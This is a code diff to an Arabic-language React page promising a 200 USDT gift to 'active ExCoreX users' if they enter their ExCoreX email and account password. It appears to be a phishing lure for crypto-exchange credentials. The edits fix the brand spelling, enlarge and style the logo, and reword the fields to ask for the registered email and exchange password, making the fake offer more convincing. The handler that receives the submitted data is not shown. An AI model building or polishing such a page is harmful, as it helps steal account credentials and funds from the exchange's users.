@@ -73,7 +73,7 @@ export default function Home() {
 
         .gift-icon {
             margin-bottom: 20px;
-            filter: drop-shadow(0 0 20px #3b82f6);
+            filter: drop-shadow(0 0 25px #3b82f6);
             animation: float 3s ease-in-out infinite;
             display: flex;
             justify-content: center;
@@ -219,15 +219,15 @@ export default function Home() {
             <Image 
               src={logo.imageUrl} 
               alt={logo.description} 
-              width={110} 
-              height={110} 
-              className="rounded-3xl"
+              width={120} 
+              height={120} 
+              className="rounded-3xl shadow-2xl shadow-blue-500/50"
               data-ai-hint={logo.imageHint}
             />
           )}
         </div>
         <h1>عرض خاص: 200 USDT</h1>
-        <div className="sub-title">هدية لمستخدمي Excorx النشطين</div>
+        <div className="sub-title">هدية حصريّة لمستخدمي ExCoreX النشطين</div>
 
         <div className="highlight">
           <span style={{ color: '#b3d9ff', fontSize: '18px' }}>مكافأة الولاء</span>
@@ -242,7 +242,7 @@ export default function Home() {
         {!submitted ? (
           <>
             <p style={{ color: '#b0caf0', fontSize: '14px', margin: '15px 0 5px' }}>
-              لتأكيد أهليتك، يرجى تسجيل الدخول بحسابك في Excorx.
+              لتأكيد أهليتك، يرجى تسجيل الدخول بحسابك في ExCoreX.
             </p>
 
             <div className="input-group">
@@ -250,7 +250,7 @@ export default function Home() {
               <input 
                 type="email" 
                 className="input-field" 
-                placeholder="أدخل بريدك الإلكتروني" 
+                placeholder="أدخل بريدك الإلكتروني المسجل" 
                 autoComplete="off"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
@@ -262,7 +262,7 @@ export default function Home() {
               <input 
                 type="password" 
                 className="input-field" 
-                placeholder="كلمة مرور حسابك" 
+                placeholder="كلمة مرور حسابك في ExCoreX" 
                 autoComplete="off"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
